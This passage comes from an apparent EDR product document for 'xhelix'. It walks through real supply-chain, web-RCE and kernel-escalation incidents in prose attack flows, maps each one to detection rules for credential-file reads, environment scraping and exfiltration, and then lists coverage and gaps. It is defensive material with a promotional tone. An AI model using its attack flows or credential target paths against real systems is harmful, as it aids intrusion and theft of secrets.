| 3 | `pkg/egressguard` | ActiveMQ JVM's BRP profile declares legitimate peer set (downstream consumers, broker peers). Attacker C2 = undeclared → `EgressVerify` → `EgressDeny` in enforce |
| 3 | rule | `metadata.access_by_unexpected` if the script tries IMDS for cloud creds |
| 4 | `pkg/brp/runtime.go` | JVM spawning shell to run the payload → `brp.hard_deny` Class 1 |
| 4 | `pkg/correlator` | **`dropped_binary_lifecycle`** chain: outbound + exec-from-tmp |
| 5 | `pkg/fim` + `pkg/persistencewatch` | systemd / cron persistence drop → Class 2 |

**MITRE:** `T1190`, `T1190.003` (Deserialization), `T1059.004`, `T1105`

**Verdict:** stage 3 egress + stage 4 brp.hard_deny + correlator chain = **three independent fires** before the payload can establish persistence.

---

## 21. F5 BIG-IP iControl REST RCE (CVE-2022-1388, May 2022)

**Real incident.** Authentication bypass in F5 BIG-IP allowed unauthenticated attackers to invoke iControl REST endpoints. Exploits chained to wipe configs, drop webshells, or pivot.

**Attack flow on a Linux-based F5 appliance:**

1. Attacker sends crafted HTTP with bypassed auth headers to `/mgmt/tm/util/bash`
2. The endpoint runs arbitrary bash commands as root
3. Attacker drops a webshell or steals the appliance's signing keys
4. Optionally wipes `/config/bigip.conf` or pivots to internal networks

**How xhelix catches it (assume xhelix deployed on the F5 management Linux):**

| Stage | Component | What fires |
|---|---|---|
| 2 | `pkg/brp/runtime.go` | The F5 control-plane role (httpd / Java backend) spawning arbitrary bash → `brp.hard_deny` Class 1 |
| 3 | `pkg/secrettaint` | Read of `/config/ssl/ssl.key/` (F5 signing keys) → `SecretSigningKey` taint |
| 3 | `pkg/fim` | Webshell drop to `/usr/local/www/` → `fim.drift` + `AssetWebDocRoot` |
| 4 | `pkg/fim` | Write to `/config/bigip.conf` → `AssetSystemConfig` weighting, high-severity drift |
| 4 | `pkg/egressguard` | Pivot to internal subnet from F5 management role → undeclared peer → `EgressDeny` |

**MITRE:** `T1190`, `T1059.004`, `T1552.001`, `T1485` (Data Destruction)

**Verdict:** F5 appliances are notoriously closed-source — xhelix gives you a Linux-host-level observation layer the F5 itself doesn't expose. Stage 2 `brp.hard_deny` catches every variant of "F5 control plane spawning shell."

---

## 22. Polyfill.io CDN compromise (June 2024)

**Real incident.** The widely-used `polyfill.io` CDN was acquired by an attacker who modified the JavaScript responses to inject malware into 100,000+ websites. Affected sites unknowingly served malicious JS to every visitor.

**Attack flow on a Linux web server using polyfill.io:**

1. Server-rendered page includes `<script src="https://cdn.polyfill.io/..."></script>`
2. CDN serves modified JS to specific user-agents (mobile, certain geos)
3. Malicious JS runs in the visitor's browser — not the server
4. **But also:** the website's reverse proxy / SSR layer might fetch polyfill JS server-side for bundling

**xhelix's role (server-side):**

| Stage | Component | What fires |
|---|---|---|
| 4 (SSR) | `pkg/egressguard` | Reverse proxy / SSR fetching from `polyfill.io` — if the server-side fetch was added recently (after profile snapshot), it's an undeclared peer → `EgressVerify` |
| 4 (SSR) | `pkg/snicheck` | Outbound TLS to `polyfill.io` without expected cert SAN (Phase K.3 cert SAN cross-validation, planned) — alert on cert chain change |
| Indirect | `pkg/dnsresolver` | DNS query log records every polyfill.io resolution — operator can correlate with public IOC disclosure |

**Honest gap:** the in-browser attack happens client-side. xhelix is server-side EDR — **it does not protect site visitors**. What xhelix does protect:
- The web server itself if the malicious JS attempts to call back to the same server with attack patterns
- The build/CI pipeline if `polyfill.io` is fetched server-side and bundled — the moment that fetch points to an attacker-controlled host, egressguard sees the new destination
- The operator's audit trail — every polyfill.io fetch is in the forensic chain, replayable offline

**MITRE:** `T1195.002`, `T1059.007` (JavaScript), `T1071.001`

**Verdict:** xhelix's coverage of this incident is **partial and honest**. Server-side detection works; client-side does not. **Phase K.3 cert SAN cross-validation** (planned, 3-5d) closes the "polyfill.io's cert chain changed when attacker took over" gap server-side. This is in the locked roadmap, not just aspirational.

---

---

# Part 2 — Recent (2025-2026) verified real incidents

The following scenarios are sourced from live web search of public vendor advisories, CISA KEV catalog entries, and security-vendor incident reports. CVE numbers and dates are verified against the cited sources at the end of this document.

---

## 23. CVE-2026-45321 — "Mini Shai-Hulud" self-spreading npm worm (May 11, 2026)

**Real incident.** A coordinated supply-chain attack compromised **170+ npm packages and 2 PyPI packages totaling 404 malicious versions** in a single day. Targets included the **entire TanStack router ecosystem (42 packages), Mistral AI's SDK suite, UiPath's automation tooling (65 packages), OpenSearch (1.3M weekly npm downloads), and Guardrails AI**.

Attribution: TeamPCP (same operators behind SAP, Checkmarx, Bitwarden, Lightning, Intercom, Trivy compromises).

**Attack flow:**

1. Attacker creates a fork of `TanStack/router` (renamed to `zblgg/configuration` to evade fork-list searches)
2. Opens a pull request that triggers a `pull_request_target` workflow
3. The workflow checks out + executes the attacker's fork code
4. Cache poisoning: attacker's malicious `pnpm` store is written into the GitHub Actions cache
5. OIDC token extraction from runner memory
6. Worm publishes malicious versions across all 42 @tanstack/* packages within minutes
7. End-user `npm install` of any affected package executes credential-stealing postinstall
8. Worm propagates by stealing the new victim's npm token and publishing further malicious versions

**Why signature EDR misses it:**
- Maintainer-signed packages with valid signatures (after takeover)
- Detected publicly only 20-26 minutes after publish — IOC feeds slow to update
- npm install + node_modules write are routine CI/CD operations

**How xhelix catches it on a Linux dev or CI host:**

| Stage | Component | What fires |
|---|---|---|
| 7 | `pkg/correlator` | **`dropped_binary_lifecycle`** (Phase J.2): postinstall fetches external script → writes to `node_modules/*/.bin/` → exec → Class 3 |
| 7 | `pkg/secrettaint` | Postinstall reads `~/.npmrc` (npm auth token), `~/.aws/credentials`, env, GitHub Actions secret env → `SecretGitToken` + `SecretCICDToken` + `SecretCloudCreds` taint accumulation |
| 7 | `pkg/burstdet` | Worm payload reads dozens of secret-paths in seconds → `file_read_burst` Class 2 |
| 8 | `pkg/egressguard` | Outbound to attacker-controlled exfil endpoint from CI runner's BRP profile → undeclared peer → `EgressDeny` (in enforce mode) |
| 8 | `pkg/procscrape` | `/proc/self/environ` mass read for env-stored secrets → `cred_proc_scrape=true` |
| 8 | rule | `metadata.access_by_unexpected` if worm pivots to IMDS for cloud creds |

**MITRE:** `T1195.002`, `T1552.001`, `T1567`, `T1098` (Account Manipulation — for npm token theft used to spread)

**Verdict:** xhelix's secret-taint + dropped-binary-lifecycle chain trips Class 2 and Class 3 alerts within seconds of the malicious postinstall. The **worm-self-spreading** aspect needs Phase H.2 long-window correlation (planned) to track multi-day token-theft → republish chains.

---

## 24. CVE-2026-41940 — cPanel/WHM Authentication Bypass (Feb-April 2026)

**Real incident.** A critical authentication bypass in cPanel/WHM (CVSS 9.8). Affects **all versions after 11.40 (released in 2013)**. Exploited as **zero-day since February 2026, patched April 30, 2026**. Used to deploy **Mirai botnet variants and the "Sorry" ransomware strain**. Over **1.5 million cPanel servers** affected — cPanel runs on **70 million+ domains**.

**Attack flow:**

1. Attacker sends crafted HTTP to cPanel's `cpsrvd` daemon
2. Before authentication, cpsrvd writes a new session file to disk
3. Attacker manipulates the `whostmgrsession` cookie by omitting an expected segment, avoiding the encryption process for attacker-provided values
4. Bypass succeeds; attacker now has authenticated access to WHM
5. Drops Mirai bot or Sorry ransomware payload
6. Exfiltrates customer/tenant data
7. Persists via cron/systemd

**Why signature EDR misses it:**
- The exploit is just an HTTP request — no payload in the request body
- cPanel session files are written every login, distinguishing malicious from benign requires sequence analysis
- Authentication-bypass leaves no obvious failed-auth log entry

**How xhelix catches it:**

| Stage | Component | What fires |
|---|---|---|
| 2 | `pkg/fim` | New session file write to `/var/cpanel/sessions/` from unauthenticated source — high write rate from a single source IP is anomalous |
| 4 | `pkg/source` | Successful "login" anchor without a preceding identity event (no real PAM/SSH) → orphan source anchor flagged in verifier's `SourceLineage` domain |
| 5 | `pkg/brp/runtime.go` | cpsrvd spawning bash/perl to drop the payload — cPanel's BRP profile lists allowed children (`mysqld_safe`, `php-fpm`, internal helpers) — bash not in list → `brp.hard_deny` Class 1 |
| 5 | `pkg/correlator` | **`dropped_binary_lifecycle`** (J.2): cpsrvd-child fetches payload → exec from `/tmp/` → Class 3 |
| 6 | `pkg/secrettaint` | Read of `/var/cpanel/users/*` (customer data) → multi-tenant `SecretCustomerData` taint |
| 7 | `pkg/fim` + `pkg/persistencewatch` | Cron / systemd persistence drop → Class 2 |

**MITRE:** `T1190`, `T1078` (Valid Accounts via session forgery), `T1059.004`, `T1486` (Data Encrypted for Impact — ransomware)

**Verdict:** stage 5 `brp.hard_deny` is the line of defense — even though the auth bypass at stage 2-4 is invisible to host EDR, the moment cpsrvd spawns a shell or non-listed child, Class 1 fires.

---

## 25. CVE-2026-31431 — Linux Kernel "Copy Fail" zero-day (April-May 2026)

**Real incident.** Linux kernel zero-day in the **algif_aead AF_ALG cryptographic subsystem** — a logic bug in the authentication cryptographic template causing improper memory handling during in-place operations. **732-byte Python exploit gives root from unprivileged user.** Roots stretching back to kernel changes in 2011, 2015, 2017. CISA added to KEV catalog **May 1, 2026, mandatory federal patch deadline May 15, 2026**. Patches in kernel 6.18.22, 6.19.12, 7.0.

**Critical for Kubernetes:** the kernel's module auto-loading mechanism auto-loads `algif_aead` on demand when any process (including unprivileged containers) creates an AF_ALG socket — meaning **an attacker with code execution in any pod (even non-root) can escalate to root on the host**.

**Attack flow:**

1. Attacker has code execution in any container (compromised pod, supply-chain implant, exec into pod)
2. Creates AF_ALG socket — kernel auto-loads `algif_aead`
3. Triggers the in-place authentication bug
4. Kernel writes attacker-controlled bytes to a privileged kernel memory region
5. Escalates to root on the **node**, not just the container
6. From node root, attacker can read every other tenant's secrets, pivot across the cluster

**Why signature EDR misses it:**
- No syscall is obviously malicious in isolation
- The exploit is 732 bytes — fits in a normal Python script
- AF_ALG sockets are legitimate kernel cryptography interface

**How xhelix catches it:**

| Stage | Component | What fires |
|---|---|---|
| 2 | `pkg/ebpf` | AF_ALG socket creation by an unprivileged container process — outside the host's BRP profile of allowed crypto-API users → `verifier.SourceLineage` weight |
| 3-4 | `pkg/ebpf` | `bpf_syscall_unexpected` if attacker tries to load BPF as part of the exploit; capset / unshare anomalies during exploit → Class 3 |
| 5 | `pkg/capwatch` | `cap.gained` Class 3 — UID 0 transition from inside a container is a hard anomaly when the container is non-privileged |
| 5 | rule | `uid0_transition=true` tag from eBPF cred-change instrumentation → escalation detected |
| 6 | `pkg/contescape` | `contescape.detected` — root from inside a container that's not labeled privileged |
| 6 | `pkg/secrettaint` | Subsequent reads of `/etc/kubernetes/`, `/var/lib/kubelet/`, peer-tenant volumes → multi-tenant taint |
| 6 | `pkg/egressguard` | Cross-pod or off-node outbound from a process that was never supposed to talk outside its pod → `EgressDeny` |

**MITRE:** `T1068` (Exploitation for Privilege Escalation), `T1611` (Escape to Host), `T1078.003` (Valid Accounts: Local Accounts — via root)

**Verdict:** stage 5-6 fires multiple Class 2/3 alerts. The exploit itself (stages 2-4) is silent at the host-EDR level, but the **post-exploit pivot is hard to hide** — root from a non-privileged container, cross-pod access, cluster-secret reads all trip canonical xhelix detectors.

---

## 26. Linux "Dirty Frag" zero-day (early 2026)

**Real incident.** Chained kernel flaws — **xfrm-ESP Page-Cache Write** + **RxRPC Page-Cache Write** — allow local attackers to gain root privileges on **most major Linux distributions with a single command**. The chain modifies protected system files in memory without authorization.

**Attack flow:**

1. Unprivileged local user runs the single-command exploit
2. xfrm-ESP page-cache write primitive overwrites a privileged file in page cache
3. RxRPC primitive flips a permission bit / triggers privileged code path
4. Attacker gains root
5. Standard post-exploitation: persistence, lateral move, exfil

**How xhelix catches it:**

| Stage | Component | What fires |
|---|---|---|
| 2-3 | `pkg/lsmaudit` (observe) | xfrm/RxRPC syscall sequence is unusual for non-root userspace; LSM audit captures the anomaly |
| 4 | `pkg/capwatch` | `cap.gained` + `uid0_transition=true` from a non-root parent → Class 3 |
| 4 | rule | `kernel_lpe_exploit` (ruleset/core/advanced.yaml) — covers the general "non-root → root via kernel" pattern |
| 5 | post-exploit | Same chain as CVE-2026-31431 — multi-Class fires on persistence, cross-pod, cluster-secret reads |

**MITRE:** `T1068`, `T1078.003`

**Verdict:** xhelix catches the **escalation transition**, not the kernel primitive abuse itself. Phase I (BPF-LSM synchronous deny, planned 7d) extends this to actually block the `cap.gained` event at the LSM hook rather than alerting after the fact.

---

## 27. CVE-2025-30066 — tj-actions/changed-files GitHub Action compromise (March 2025)

**Note: While dated 2025, this incident has had ongoing remediation activity into 2026 and remains a canonical reference for GitHub Actions supply chain attacks.**

**Real incident.** Attacker compromised the popular `tj-actions/changed-files` GitHub Action (used by **23,847 public repositories + an estimated 41,000+ private repositories**). Modified versions v45.0.1 - v45.0.3 (Feb 27 - March 2, 2025) ran credential-harvesting code dumping all environment variables including GITHUB_TOKEN, AWS keys, and custom secrets.

**Attack flow on a GitHub Actions runner (Linux):**

1. CI workflow includes `uses: tj-actions/changed-files@v45` (or `@latest`)
2. GitHub Actions checks out the malicious version
3. Action's modified `entrypoint.sh` runs obfuscated shell that dumps env
4. Env dump (containing all CI secrets) is exfiltrated via:
   - Writing to action logs (publicly visible for public repos)
   - Outbound to attacker C2
5. Attacker uses stolen GitHub_TOKEN to compromise downstream repos
6. **At least 14 confirmed secondary breaches** chained from these initial credential thefts

**Why signature EDR misses it:**
- GitHub Actions runs are routine in CI/CD environments
- Action checkout + shell execution are allowlisted operations
- Public-action signatures are trusted by default

**How xhelix catches it on a self-hosted GitHub runner:**

| Stage | Component | What fires |
|---|---|---|
| 3 | `pkg/procscrape` | `getenv` / `/proc/self/environ` mass read by an action's shell wrapper → `proc_scrape=environ` tag → `cred_proc_scrape=true` |
| 3 | `pkg/secrettaint` | Detected env-secret reads (GITHUB_TOKEN, AWS_*, custom secrets) → multi-class taint |
| 4 | `pkg/egressguard` | Action attempting outbound to non-GitHub destination → undeclared peer for CI runner BRP profile → `EgressVerify` → `EgressDeny` in enforce |
| 4 | rule | `metadata.access_by_unexpected` if action tries IMDS for runner cloud creds |
| 4 | `pkg/correlator` | env-read → outbound = `cred_scrape_then_exfil` chain (Phase J family — add named rule) |

**MITRE:** `T1195.001`, `T1552.001`, `T1567.002` (Exfiltration to Cloud Storage)

**Verdict:** **xhelix is built for this exact scenario** — `procscrape` + `secrettaint` + `egressguard` together compose a hard contract that says "CI actions can read env, but env-secrets reaching outbound = block." Phase N broker mediation (planned 10-15d) is the deeper fix: secrets are released only as short-lived bound tokens, not raw env values.

---

## 28. CVE-2026-20131 — Cisco Secure Firewall Management Center (FMC) zero-day (Jan-March 2026)

**Real incident.** Critical zero-day in Cisco Secure Firewall Management Center (CVSS **10.0**). **Insecure deserialization** in the web-based management interface. Unauthenticated remote code execution as **root**. **Exploited as zero-day since January 26, 2026** by the **Interlock ransomware** group — more than a month before public disclosure. Patched March 4, 2026.

**Attack flow on the Linux-based FMC appliance:**

1. Attacker sends crafted serialized Java object to FMC's web management interface
2. FMC deserializes → instantiates attacker class → RCE as root
3. Attacker has full control of the firewall management plane
4. Drops Interlock ransomware loader
5. Pivots to managed firewalls + downstream network segments
6. Custom RATs + reconnaissance scripts deployed
7. Eventually triggers ransomware encryption on managed assets

**How xhelix catches it (assume xhelix on the FMC appliance Linux underneath):**

| Stage | Component | What fires |
|---|---|---|
| 2 | `pkg/brp/runtime.go` | FMC's BRP profile lists allowed children for the Java backend. Any shell or non-Java exec spawned by the management JVM → `brp.hard_deny` Class 1 |
| 2 | rule | `web_spawns_shell` Class 2 — backup detector |
| 4 | `pkg/correlator` | **`dropped_binary_lifecycle`**: management JVM outbound → exec from `/tmp/` or `/var/tmp/` |
| 5 | `pkg/egressguard` | Outbound to non-Cisco infrastructure from FMC management role → undeclared peer → `EgressDeny` |
| 5 | `pkg/secrettaint` | Read of FMC's per-firewall management certs and credentials → `SecretSigningKey` + `SecretCloudCreds` taint |
| 6 | `pkg/tamperguard` | If attacker tries to disable host-side logging or auditing → `tamper_*` Class 1 |
| 7 | `pkg/fim` | Mass file modification (ransomware encryption pattern) → high-rate `fim.drift` |

**MITRE:** `T1190`, `T1190.003` (Deserialization), `T1059.004`, `T1486`, `T1098`

**Verdict:** Cisco FMC appliances often lack host-level observability. **xhelix gives operators a Linux-host audit layer the appliance itself doesn't expose.** Stage 2 `brp.hard_deny` catches "management plane spawns shell" — the canonical post-deserialization signal.

---

## 29. Microsoft durabletask PyPI compromise (May 19, 2026)

**Real incident.** Three malicious versions (1.4.1, 1.4.2, 1.4.3) of Microsoft's **official `durabletask` Python SDK** were published to PyPI within a **35-minute window** on May 19, 2026. The package is the official SDK for **Azure Durable Functions** — **400,000+ downloads/month**.

The compromised package silently downloads + executes a **28 KB payload** that steals credentials from **AWS, Azure, GCP, Kubernetes, password managers, and 90+ developer tool configurations**. Attack linked to **TeamPCP** (same group as Mini Shai-Hulud). The payload **skips systems with a Russian locale** — classic Eastern European cybersecurity-operations hallmark.

**Attack flow:**

1. User runs `pip install --upgrade durabletask` on a build / dev / CI host
2. Postinstall fetches 28 KB payload from attacker-controlled CDN
3. Payload checks system locale; if Russian, exits silently
4. Otherwise, enumerates ~90 paths: `~/.aws/credentials`, `~/.azure/`, `~/.config/gcloud/`, `~/.kube/config`, `~/.pgpass`, browser password DBs, Docker creds, Slack tokens, npm authrcs, pip credentials
5. Validates stolen creds via AWS/Azure/GCP API calls
6. Exfiltrates to attacker C2 with multi-cloud worm semantics — pivots laterally using the stolen creds

**How xhelix catches it:**

| Stage | Component | What fires |
|---|---|---|
| 1 | `pkg/pkgmgr` (Phase K.2 planned) | pip child in `pkg_install_window=true` |
| 2 | `pkg/correlator` | **`dropped_binary_lifecycle`** chain: pip → outbound fetch → write payload → exec → Class 3 |
| 4 | `pkg/secrettaint` | Mass read of 90+ secret paths → multi-class taint accumulation (`SecretCloudCreds` ×3, `SecretKubeToken`, `SecretBrowserSession`, `SecretGitToken`, `SecretCICDToken`, …) |
| 4 | `pkg/burstdet` | 90 file reads in seconds by one PID → `file_read_burst` Class 2 |
| 5 | rule | `metadata.access_by_unexpected` — payload validates AWS creds via STS / IMDS → Class 1 hard invariant fires (non-cloud-aware role hitting IMDS) |
| 6 | `pkg/egressguard` | Bulk outbound to attacker exfil endpoint after secret-taint promotion → `EgressDeny` |
| 6 | `pkg/correlator` | "Mass secret-read → outbound after taint" composite chain → Class 1 incident |

**MITRE:** `T1195.002`, `T1552.001`, `T1552.005` (IMDS), `T1567`, `T1090` (Proxy via worm spread)

**Verdict:** the **multi-secret-read burst at stage 4 + cloud-creds validation at stage 5 + post-taint outbound at stage 6** fire **three separate Class 2/1 alerts** within a 90-second window. xhelix's `procscrape` + `secrettaint` + `egressguard` ensemble was **explicitly designed for the credential-stealer-with-cloud-pivot threat model**.

---

## 30. TrapDoor cross-ecosystem worm (May 22, 2026)

**Real incident.** Codename **TrapDoor** — **34+ malicious packages across 384+ versions** spanning **npm, PyPI, and CratesIO** (Rust ecosystem). Earliest activity recorded May 22, 2026 at 8:20 PM UTC. Payload:
- Scans for credentials + developer secrets
- Validates stolen creds via AWS and GitHub APIs
- Creates persistence via **cron jobs, systemd services, Git hooks**
- Lateral movement via **SSH**

**Attack flow on a Linux dev or CI host:**

1. `npm install` / `pip install` / `cargo add` of any affected package
2. Postinstall payload runs
3. Payload scans for AWS keys, GitHub tokens, env secrets, ssh keys, cloud configs
4. Validates stolen creds via API calls (live-validate before exfil)
5. **Persistence quadrupled** — drops cron job + systemd service + Git pre-commit hook + bashrc modification
6. SSH-based lateral movement to discovered peers (using stolen `~/.ssh/known_hosts` + stolen keys)
7. Self-propagation via compromised CI/CD pipelines

**How xhelix catches it:**

| Stage | Component | What fires |
|---|---|---|
| 2 | `pkg/correlator` | **`dropped_binary_lifecycle`** for the postinstall payload |
| 3 | `pkg/secrettaint` | Mass secret-path reads → multi-class taint |
| 3 | `pkg/burstdet` | `file_read_burst` Class 2 |
| 4 | rule | `metadata.access_by_unexpected` on AWS API calls from non-cloud role |
| 5 | `pkg/fim` + `pkg/persistencewatch` | **Quadruple persistence detection** — cron write → `cron_new_unit`; systemd unit write → `CategorySystemdUnit`; bashrc mod → `fim.drift`; Git hook write → `fim.drift` on `.git/hooks/` |
| 5 | `pkg/correlator` | The **persistence-quad pattern is itself a chain rule** — adding any 3 of {cron, systemd, bashrc, git-hook} writes within 30s by one lineage = Class 2 incident |
| 6 | `pkg/sshbrute` (Phase J.1) | If lateral SSH attempts → counter trips |
| 6 | `pkg/egressguard` | Outbound SSH from CI / dev role's lineage → undeclared peer → `EgressDeny` |

**MITRE:** `T1195.002`, `T1552.001`, `T1053.003`, `T1547.001`, `T1078.003`, `T1021.004` (SSH)

**Verdict:** TrapDoor is **a near-perfect demonstration of xhelix's multi-detector composability**. It trips 5+ named detectors across 4 phases (secret-read burst, dropped-binary, multi-persistence, lateral SSH). The redundancy means even if one detector is muted by operator, the others catch the chain.

---

## 31. CVE-2026-44477 — CloudNativePG PostgreSQL RCE (2026)

**Real incident.** Critical RCE (CVSS **9.4**) in CloudNativePG — a popular Kubernetes operator for running PostgreSQL clusters. The vulnerability allows an attacker with database connection privileges to escalate to **PostgreSQL superuser** and from there execute arbitrary code on the underlying Kubernetes pod.

**Attack flow:**

1. Attacker has DB-user-level access (legitimate creds, leaked, or via app vulnerability)
2. Exploits CloudNativePG bug to gain `postgres` superuser
3. As superuser, uses `COPY ... PROGRAM ...` or extension-loading to execute shell commands inside the PG pod
4. Reads `/var/run/secrets/kubernetes.io/serviceaccount/token` (kube SA token)
5. Uses SA token to call Kubernetes API — escalates from pod to namespace control
6. Lateral move to peer pods / cluster-wide reads

**How xhelix catches it:**

| Stage | Component | What fires |
|---|---|---|
| 3 | `pkg/brp/runtime.go` | PostgreSQL's BRP profile lists `AllowedChildren = [postgres-helper, archive_command_helper]`. `/bin/sh` from `COPY PROGRAM` is not in the list → `brp.hard_deny` Class 1 |
| 3 | rule | `web_spawns_shell` equivalent for DB roles |
| 4 | `pkg/secrettaint` | Read of `/var/run/secrets/kubernetes.io/serviceaccount/` → `SecretKubeToken` taint |
| 4 | rule | `metadata.access_by_unexpected` if attacker queries IMDS too |
| 5 | `pkg/egressguard` | Outbound to `kubernetes.default.svc.cluster.local` from postgres role → if not in BRP `UpstreamHosts`, `EgressDeny` |
| 6 | `pkg/correlator` | Cross-pod / cluster-wide pattern → Phase H.2 long-window correlation catches multi-step pivoting |

**MITRE:** `T1190`, `T1059.004`, `T1552.001`, `T1078.001` (Valid Accounts: Default Accounts — for `postgres` superuser)

**Verdict:** stage 3 `brp.hard_deny` Class 1 is the immediate kill. PostgreSQL spawning shell is **never legitimate in CloudNativePG production deployments** — the BRP profile makes this an unambiguous contract violation.

---

## 32. CVE-2026-27825 — Atlassian MCP / Confluence SSRF→RCE (May 2026)

**Real incident.** Critical (CVSS **9.1**) **arbitrary file write via Confluence attachment download path** in the `mcp-atlassian` server (Model Context Protocol server for Confluence/Jira). Combined with **CVE-2026-27826** (SSRF via Atlassian URL headers, CVSS 8.2), forms a **MCPwnfluence** attack chain — unauthenticated SSRF→RCE on widely-deployed Atlassian MCP servers (network-exposed deployments especially affected).

**Attack flow:**

1. Attacker sends request to network-exposed mcp-atlassian server
2. SSRF vulnerability (CVE-2026-27826) — server fetches attacker-controlled URL
3. Attacker chains to attachment-download endpoint — arbitrary file write via path traversal
4. Writes a payload to a path that triggers code execution (e.g., a `__init__.py` in the MCP server's Python path, or a webroot file)
5. Subsequent request triggers the payload — RCE
6. Standard post-exploit chain: persistence, secrets, lateral

**How xhelix catches it:**

| Stage | Component | What fires |
|---|---|---|
| 2 | `pkg/egressguard` | mcp-atlassian's BRP profile declares Confluence/Jira API as the only legitimate upstream. SSRF outbound to attacker URL = undeclared peer → `EgressDeny` (kills the SSRF before file-write payload is fetched) |
| 3 | `pkg/fim` | Attachment write to path **outside** the BRP `FileWrites` allowlist (e.g., a Python site-packages path or webroot) → `fim.drift` Class 3 + asset-class weighting |
| 4 | `pkg/brp/runtime.go` | When the dropped payload is imported / executed, mcp-atlassian's role profile checks: is the new module path in declared file paths? No → `brp.verify_protected_path` → escalate |
| 5 | `pkg/brp/runtime.go` | mcp-atlassian process spawning shell to run second-stage = `brp.hard_deny` Class 1 |
| 5 | `pkg/correlator` | Sequence: outbound → file-write to off-path → exec → Class 2 incident |

**MITRE:** `T1190`, `T1505.003`, `T1059.004`, `T1190` (Exploit Public-Facing Application — chained SSRF+RCE)

**Verdict:** **two independent xhelix protections** apply — stage 2 egressguard kills the SSRF reach-out, and stage 3 FIM catches the off-path write. Either alone is enough; together they're belt-and-suspenders. The integration of **AI/ML agent infrastructure (MCP servers, AI gateways)** with traditional enterprise services is a growing 2026 attack surface — xhelix's role-based contracts apply identically.

---

## Threat coverage matrix

Concise summary across all 32 scenarios:

| Scenario | Stage caught | xhelix Class | Notes |
|---|---|---|---|
| XZ Utils backdoor | unauthorized child of sshd | Class 1 (`brp.hard_deny`) | Signed contract wins where signatures fail |
| SolarWinds Sunburst | C2 + recon + exfil | Class 1-2 | 12-day dormancy gap closed by Phase H.2 |
| 3CX desktop trojan | undeclared outbound peer | Class 1-2 | Same defense as supply-chain class |
| Log4Shell | JVM spawning shell | Class 1 | Textbook xhelix win |
| MOVEit zero-day | web role spawning shell + bulk DB read + undeclared exfil | Class 1-2 | Post-exploit chain detected without signature |
| Capital One IMDS SSRF | metadata access by non-cloud-role | Class 1 (`metadata.access_by_unexpected`) | One of the rules xhelix was built for |
| Cortex-c2 implant | 6+ independent stages | Class 1-3 | Specific chain rule (`dropped_binary_lifecycle`) for this class |
| TeamTNT cryptominer | credential burst + miner exec + persist | Class 2-3 | `file_read_burst` is built for this |
| SSH brute + key implant | N failures / window + authorized_keys write | Class 2-3 | Phase J.1 + canonical FIM detector |
| Container escape | privileged mount / pivot_root | Class 1-2 | `contescape.detected` + `cap.gained` |
| Memory implant (memfd) | execveat from memfd + RWX mprotect | Class 3 (multi-detector) | Strongest case for xhelix vs fileless |
| PAM module replacement | unauthorized write to security lib | Class 3 + verifier escalate | Anchored + chain-attributed |
| event-stream npm (2018) | postinstall secret-read + outbound | Class 2 | Phase K.2 closes pkg-install FP gap |
| ua-parser-js + coa + rc npm (2021) | preinstall fetch + drop + exec | Class 3 (`dropped_binary_lifecycle`) | Built for this class |
| PyTorch torchtriton (2022) | mass secret read + DNS exfil | Class 2 (`file_read_burst` + `dnsexfil`) | `procscrape` catches the env-read |
| Codecov bash uploader (2021) | `procscrape` env-read + outbound | Class 2 | Phase N broker mediation extends this |
| Apache Struts CVE-2017-5638 | JVM spawning shell | Class 1 (`brp.hard_deny`) | Canonical web-RCE detection |
| Confluence OGNL CVE-2022-26134 | OGNL → shell + persistence drop | Class 1 + Class 2 (two independent fires) | Two-stage redundancy |
| Spring4Shell CVE-2022-22965 | webroot write + shell spawn | Class 1 + Class 3 (two-stage) | Webroot write tag is the early signal |
| Apache ActiveMQ CVE-2023-46604 | undeclared egress + JVM-spawn-shell + chain | 3 independent fires | Pre-persistence detection |
| F5 BIG-IP CVE-2022-1388 | mgmt-spawning-shell + signing-key read + config wipe | Class 1 + Class 2 | Linux-level observation appliance doesn't expose |
| polyfill.io CDN (June 2024) | partial — server-side egress + cert SAN drift (Phase K.3 planned) | partial | Honest gap on client-side; server-side covered |
| **CVE-2026-45321 Mini Shai-Hulud npm worm (May 2026)** | postinstall secret-read + outbound | Class 2-3 | `dropped_binary_lifecycle` + `secrettaint` + `egressguard` ensemble |
| **CVE-2026-41940 cPanel/WHM auth bypass (Feb-Apr 2026)** | cpsrvd spawning shell + persistence drop | Class 1 (`brp.hard_deny`) | Auth bypass invisible; post-exploit chain caught |
| **CVE-2026-31431 Linux Copy Fail kernel (Apr-May 2026)** | container→root escape + cross-pod pivot | Class 2-3 | Kernel primitive silent; pivot is loud |
| Linux Dirty Frag (2026) | kernel LPE → cap.gained + uid0_transition | Class 3 | Catches the transition, not the primitive |
| **CVE-2025-30066 tj-actions/changed-files (Mar 2025)** | env-secret scrape + outbound | Class 2 | Built for this exact CI/CD pattern |
| **CVE-2026-20131 Cisco FMC zero-day (Jan-Mar 2026)** | mgmt JVM spawning shell + ransomware persistence | Class 1 + Class 2 | Linux-host observability appliance lacks |
| **Microsoft durabletask PyPI (May 19, 2026)** | 90-path secret burst + IMDS + outbound | 3 separate Class 1/2 fires | Multi-cloud credential-stealer threat model |
| **TrapDoor cross-ecosystem worm (May 22, 2026)** | quadruple persistence + lateral SSH | 5+ named detectors fire | Best demonstration of detector composability |
| **CVE-2026-44477 CloudNativePG (2026)** | postgres spawning shell + kube SA token theft | Class 1 (`brp.hard_deny`) | DB role contract is unambiguous |
| **CVE-2026-27825 MCPwnfluence (May 2026)** | SSRF → off-path write → exec | Class 1 + Class 3 | Egressguard kills SSRF; FIM catches the write |

---

## What xhelix does not catch (honest gaps)

Stated up front so the protection model is credible:

- **Pre-OS / firmware / hypervisor compromise** — xhelix is a Linux host agent. If the kernel is malicious before xhelix loads, we lose.
- **Kernel zero-day that disables BPF before xhelix starts** — observable post-fact (xhelix's BPF programs fail to load) but not preventable.
- **Insider with root + the BRP signing key** — separation-of-duties is operator policy, not enforced by xhelix v1.
- **Time-shifted attacks across days/weeks** — Phase H.2 long-window correlation (planned, 5-7d) closes this; today's correlator is short-window only.
- **CDN-cloaked C2 sharing a TLS SAN with legitimate traffic** — Phase H.4 planned (3-5d).
- **Workstation browser/cookie/session containment** — different product class; xhelix is server-side.

These gaps are explicit in `docs/BRP_IMPLEMENTATION_PLAN_2026-05-24.md` with budgets, merge gates, and risk register. **No marketing promise xhelix does not back with code.**

---

## How to verify these scenarios on your own host

```bash
# Run the bundled realistic credential-harvester corpus
sudo bash tests/attack-sim/run-all.sh

# Check what fired
xhelixctl rules fp
xhelixctl rules soak
xhelixctl incidents list
xhelixctl incidents show <id>

# Trace any alert back to ground truth
